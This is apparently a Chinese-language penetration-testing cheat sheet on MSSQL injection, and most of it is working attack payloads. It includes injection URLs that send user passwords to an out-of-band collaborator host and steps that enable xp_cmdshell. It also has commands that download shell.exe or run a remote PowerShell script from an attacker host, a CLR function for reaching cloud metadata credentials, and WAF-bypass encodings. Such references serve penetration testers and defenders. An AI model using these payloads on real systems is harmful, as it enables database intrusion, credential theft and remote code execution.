---
attack_surface: [注入类]
impact: [远程代码执行, 信息泄露, 权限提升]
risk_level: 严重
prerequisites:
  - SQL 注入基础
  - MSSQL 架构与函数
difficulty: 高级
related_techniques:
  - mysql-injection
  - oracle-injection
  - postgresql-injection
  - ssrf-server-side-request-forgery
tools:
  - sqlmap
  - Burp Suite
  - Responder
---

# MSSQL Injection — 专项技术与 SSRF

> 关联文档：[SQL Injection 总览](../README.md) · [MySQL Injection](../MySQL%20Injection.md) · [Oracle Injection](../Oracle%20Injection.md) · [PostgreSQL Injection](../PostgreSQL%20Injection.md)

---

# 0x01 Active Directory 枚举

通过 MSSQL 函数枚举域内用户：

```sql
-- 获取域名
SELECT DEFAULT_DOMAIN();

-- 获取 Administrator SID (hex)
SELECT master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'));
-- → 0x01050000000[...]0000f401 (最后 4 字节 = 500 = Administrator RID)

-- SID → 用户名
SELECT SUSER_SNAME(0x01050000000[...]0000e803);
-- 0000e803 = 1000 → 通常是第一个普通用户 → 可遍历枚举
```

```python
# 域用户枚举辅助
import struct
def get_sid(n):
    domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
    user = struct.pack('<I', int(n)).hex()
    return f"{domain}{user}"
```

---

# 0x02 Error-Based 注入 (WAF 绕过)

使用系统函数触发类型转换错误绕过 WAF 的 `AND 1=@@version` 检测：

```sql
-- 替代 Error-Based 函数 — 拼接用户数据到错误消息
1' + USER_NAME(@@version)--
1' + DB_NAME()--
1' + FILE_NAME()--
1' + TYPE_NAME()--
1' + COL_NAME()--
1' + SUSER_NAME()--
1' + PERMISSIONS()--

-- 实际请求
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```

---

# 0x03 SSRF 技术矩阵

## 3.1 `fn_xe_file_target_read_file`

需要 `VIEW SERVER STATE` 权限：

```sql
-- 权限检查
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';

-- SSRF Payload
https://vuln.app/getItem?id=1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.burpcollaborator.net\1.xem',null,null))
```

## 3.2 `fn_get_audit_file`

需要 `CONTROL SERVER` 权限：

```sql
https://vuln.app/getItem?id=1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.burpcollaborator.net\',default,default)))
```

## 3.3 `fn_trace_gettable`

需要 `CONTROL SERVER` 权限：

```sql
https://vuln.app/getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.burpcollaborator.net\1.trc',default))
```

## 3.4 `xp_dirtree` / `xp_fileexists` / `xp_subdirs`

非官方文档化过程，限制 TCP 445 端口（SMB）：

```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');

-- xp_fileexist 替代方案
EXEC master..xp_fileexist '\\attacker-server\share\test.txt';
```

## 3.5 `xp_cmdshell` → 完整命令执行

```sql
-- 启用 xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 执行命令 (SSRF / 反弹 shell)
EXEC xp_cmdshell 'certutil -urlcache -f http://attacker/shell.exe C:\Windows\Temp\shell.exe';
EXEC xp_cmdshell 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/rev.ps1'')"';
```

## 3.6 MSSQL CLR UDF — 自定义 HTTP 客户端

需要 `dbo` / `sa` 权限，使用 .NET 代码在 SQL Server 内部发起 HTTP GET：

```csharp
public partial class UserDefinedFunctions
{
    [Microsoft.SqlServer.Server.SqlFunction]
    public static SqlString http(SqlString url)
    {
        var wc = new WebClient();
        var html = wc.DownloadString(url.Value);
        return new SqlString(html);
    }
}
```

```sql
-- 使用自定义 UDF 访问云元数据
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```

---

# 0x04 快速提取技术

## 4.1 FOR JSON 单查询提取全表

```sql
-- 一次性获取所有 schema + 表 + 列
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--

-- Error-Based 版 (需要别名用于 JSON 格式化)
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```

## 4.2 获取当前执行查询

需要 `VIEW SERVER STATE`：

```sql
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```

---

# 0x05 WAF 绕过

## 5.1 非标准空白字符

```
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
# %C2%85 = NEXT LINE (NEL)
# %C2%A0 = NO-BREAK SPACE
```

## 5.2 科学记数法 / 十六进制混淆

```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--
https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

## 5.3 点号替代 FROM 后的空格

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

## 5.4 `\N` 分隔 SELECT 和空列

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

## 5.5 无分号堆叠查询 (MSSQL 特性)

MSSQL 允许在不使用 `;` 的情况下堆叠查询：

```sql
SELECT 'a' SELECT 'b'
-- 相当于两个独立 SELECT

-- 实际攻击:
admina'union select 1,'admin','testtest123'exec('select 1')--
-- → 两个查询:
-- SELECT ... WHERE username = 'admina'union select 1,'admin','testtest123'
-- exec('select 1')--'

-- xp_cmdshell 启用:
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--

-- 空格压缩绕过:
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

---

# 0x06 参考资料

- [Advanced MSSQL Injection Tricks (PT SWARM)](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
- [AWS WAF MSSQL Bypass (GoSecure)](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)
- [Out-of-Band Exploitation Cheatsheet](https://www.notsosecure.com/oob-exploitation-cheatsheet/)
- [MSSQL UDF SQLHttp](https://github.com/infiniteloopltd/SQLHttp)
